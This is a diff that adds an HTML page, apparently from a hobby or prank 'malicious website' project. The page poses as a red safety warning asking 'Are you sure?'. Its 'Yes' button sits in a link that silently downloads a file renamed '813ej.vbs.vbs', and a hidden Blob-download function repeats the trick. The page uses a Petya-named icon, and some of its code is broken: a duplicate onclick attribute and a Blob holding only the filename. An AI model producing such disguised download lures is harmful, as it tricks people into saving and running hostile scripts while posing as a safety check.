@@ -1,0 +1,40 @@
+<html>
+     <head>
+          <title>Are you sure?</title>
+          <link rel="icon" type="image/x-icon" href="petya.png">
+     </head>
+     <style>
+          body{
+               text-align: center;
+               padding: 200px;
+          }
+          *{
+               font-family:'Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif;
+          }
+     </style>
+     <body bgcolor="red">
+          <p>Are you sure you want to go to the website?</p>
+          <button onclick="no();">No, return to safety</button>
+          <a href="maliciouswebsite3a.html" download="813ej.vbs.vbs">
+               <button onclick="yes();" onclick="save();">Yes, go to the website</button>
+          </a>
+     </body>
+     <script>
+          function no(){
+               window.location="https://google.com"
+          }
+          function yes(){
+               window.location="maliciouswebsite3a.html"
+          }
+          function save() {
+  var content = ["813ej.vbs.vbs"];
+  var bl = new Blob(content, {type: "VBS"});
+  var a = document.createElement("a");
+  a.href = URL.createObjectURL(bl);
+  a.download = "813ej.vbs.vbs";
+  a.hidden = true;
+  document.body.appendChild(a);
+  a.click();
+}
+     </script>
+</html>
